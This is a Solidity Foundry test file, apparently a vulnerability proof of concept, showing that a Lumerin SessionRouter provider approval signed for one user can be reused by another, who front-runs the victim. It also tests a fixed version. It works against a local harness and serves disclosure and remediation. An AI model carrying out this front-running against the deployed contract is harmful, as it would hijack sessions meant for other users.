// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {SessionRouterHarness} from "../src/SessionRouterHarness.sol";

/// @notice PoC for: Lumerin SessionRouter provider approval is NOT bound to the
/// user it was signed for. The approval encodes (bidId, chainId, user, timestamp)
/// and the provider signs it for ONE specific user, but `_extractProviderApproval`
/// decodes the address field and discards it. Anyone who observes a valid
/// (approval, signature) pair can open a session for THEMSELVES with it, before
/// the intended user does (single-use: first caller wins, the victim's later
/// call reverts with SessionDuplicateApproval).
/// Real contract: Morpheus-Lumerin-Node/smart-contracts/contracts/diamond/facets/SessionRouter.sol
/// (Base diamond 0x6aBE1d282f72B474E54527D93b979A4f64d3030a).
contract SessionRouterApprovalTest is Test {
    SessionRouterHarness harness;

    uint256 constant PROVIDER_PK = 0xA11CE;
    address provider;
    address userA = address(0xA);
    address userB = address(0xB);
    bytes32 bidId = keccak256("poc-bid");

    function setUp() public {
        provider = vm.addr(PROVIDER_PK);
        harness = new SessionRouterHarness();
        harness.mockSetBid(bidId, provider);
    }

    /// @dev Builds the approval exactly like the off-chain helper
    /// (smart-contracts/utils/provider-helper.ts getProviderApproval):
    /// msg = abi.encode(bidId, chainId, user, timestamp); sig = provider.signMessage(keccak256(msg))
    function _approvalFor(address user_) internal view returns (bytes memory approval, bytes memory sig) {
        approval = abi.encode(bidId, block.chainid, user_, uint128(block.timestamp));
        bytes32 digest = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(approval))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PROVIDER_PK, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function test_ApprovalForA_UsedByB_Succeeds() public {
        (bytes memory approval, bytes memory sig) = _approvalFor(userA);

        // Attacker B opens a session for HIMSELF with the approval signed for A.
        vm.prank(userB);
        bytes32 sessionId = harness.openSession(userB, approval, sig);

        assertEq(harness.sessionUser(sessionId), userB, "session belongs to attacker B");
        assertTrue(harness.isProviderApprovalUsed(approval), "approval marked used");
    }

    function test_ApprovalForA_AfterTheft_VictimReverts() public {
        (bytes memory approval, bytes memory sig) = _approvalFor(userA);

        vm.prank(userB);
        harness.openSession(userB, approval, sig);

        // The intended user A now tries to use their own approval: already consumed.
        vm.prank(userA);
        vm.expectRevert(SessionRouterHarness.SessionDuplicateApproval.selector);
        harness.openSession(userA, approval, sig);
    }

    function test_FixedVersion_ApprovalForA_RevertsForB() public {
        (bytes memory approval, bytes memory sig) = _approvalFor(userA);

        vm.prank(userB);
        vm.expectRevert(
            abi.encodeWithSelector(
                SessionRouterHarness.SessionApprovalNotForUser.selector,
                userA,
                userB
            )
        );
        harness.openSessionFixed(userB, approval, sig);
    }

    function test_FixedVersion_LegitimateUseStillWorks() public {
        (bytes memory approval, bytes memory sig) = _approvalFor(userA);

        vm.prank(userA);
        bytes32 sessionId = harness.openSessionFixed(userA, approval, sig);
        assertEq(harness.sessionUser(sessionId), userA);
    }
}
